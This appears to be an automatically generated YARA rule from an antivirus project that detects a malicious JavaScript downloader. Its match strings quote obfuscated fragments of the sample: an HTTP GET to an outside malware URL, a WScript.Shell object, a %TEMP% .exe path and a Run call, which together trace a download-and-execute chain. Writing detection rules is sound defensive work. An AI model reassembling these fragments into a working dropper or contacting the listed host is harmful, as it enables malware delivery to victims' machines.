rule sig_20160401_f0e3d76dcde9594dadf5c789a6f11c9d {
  meta:
    description = "datamaliciousorder - file 20160401_f0e3d76dcde9594dadf5c789a6f11c9d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "12cbdd8336a12e51dbe3e6ed5024e993a863aa8989ca07d3332145249e1eff91"

  strings:
    $s1  = "HirQt[IqHd](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "var MvnVb = function JxBb() {return WScript[DcOof](\"WScript\"+\".Shell\");}(), NvAs = 11;" fullword ascii
    $s3  = "function KtUji(BghZqs, SpFs){KxRy = KxRy * 1; return BghZqs - SpFs;};" fullword ascii
    $s4  = "if (HirQt[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NtiPs(){return UshSa + \"\";};" fullword ascii
    $s6  = "function FisOf() {return MvnVb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zot7JokZi.ex\" + \"e\";};" fullword ascii
    $s7  = "function YpHu() {return ((HhtUru == true) && (HhtUru == DmSif)) ? 1 : KxRy;};" fullword ascii
    $s8  = "HhtUru = true; " fullword ascii
    $s9  = "function OwAdz()" fullword ascii
    $s10 = "var QcqIr = false;" fullword ascii
    $s11 = "return KtUji(ZmgZue, ZfKn);" fullword ascii
    $s12 = "function TjHd(CgXp){MvnVb[\"R\"+\"un\"](CgXp, KxRy, KxRy);};" fullword ascii
    $s13 = "var DmSif = false;" fullword ascii
    $s14 = "}while (ZwWso);" fullword ascii
    $s15 = "DmSif = true; " fullword ascii
    $s16 = "function MxnYu(QmSc) {var BqfFf = (1, 2, 3, 4, 5, QmSc); return BqfFf;};" fullword ascii
    $s17 = "function HbYhd(){return 23;};" fullword ascii
    $s18 = "var HhtUru = false;" fullword ascii
    $s19 = "var CrJz = new this[\"Date\"]();" fullword ascii
    $s20 = "function EeCf(){return DcOof;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}